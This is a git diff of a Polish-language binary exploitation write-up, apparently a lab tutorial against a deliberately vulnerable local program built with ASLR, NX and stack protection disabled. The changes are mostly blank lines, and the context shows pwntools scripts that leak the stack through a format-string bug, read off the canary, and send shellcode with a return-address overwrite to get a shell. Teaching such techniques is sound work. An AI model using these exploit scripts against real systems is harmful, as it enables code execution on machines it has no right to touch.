@@ -74,7 +74,7 @@ Założenia kompilacji:
 * Wyłączone ASLR = `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`
 * Wyłączone NX = `-z execstack`
 * Wyłączone Stack Cannary = `-fno-stack-protector`
-
+* Wyłączone PIE - `no-pie` 
 ```c
 #include <stdio.h>
 #include <string.h>
@@ -180,8 +180,11 @@ Pierwszą rzeczą jaką wykonałem to sprawdzenie co znajduje się na stosie. U�
 from pwn import *
 
 p = process('./vuln-3.o')
+
 p.writeline("%p " * 199)
+
 data = p.readline()
+
 data = data.split(b" ")
 
 for i in range(len(data)):
@@ -262,12 +265,14 @@ p = process('./vuln-3.o')'
 p.writeline("%p " * 199)
 
 data = p.readline()
+
 data = data.split(b" ")
 
 for i in range(len(data)):
     log.info("{} {}".format(i, data[i]))
 
 canary = int(data[154],16)
+
 log.info("CANARY: 0x%08x" % canary)
 
 shellcode_asm = """
@@ -282,17 +287,27 @@ shellcode_asm = """
 """
 
 shellcode = asm(shellcode_asm)
+
 buffer_len = 600
+
 some_addres = int(data[157],16)
+
 offset = 628
+
 buffer_addres = some_addres - offset
 
 log.info("BUFFER: 0x%08x" % buffer_addres)
 
 send = shellcode + b"A"* (buffer_len - len(shellcode)) + p32(canary) + b"BBBBCCCCDDDD" + p32(buffer_addres)
+
 p.sendline(send)
+
 p.interactive()
 ```
+
+
+
+
 
 
 
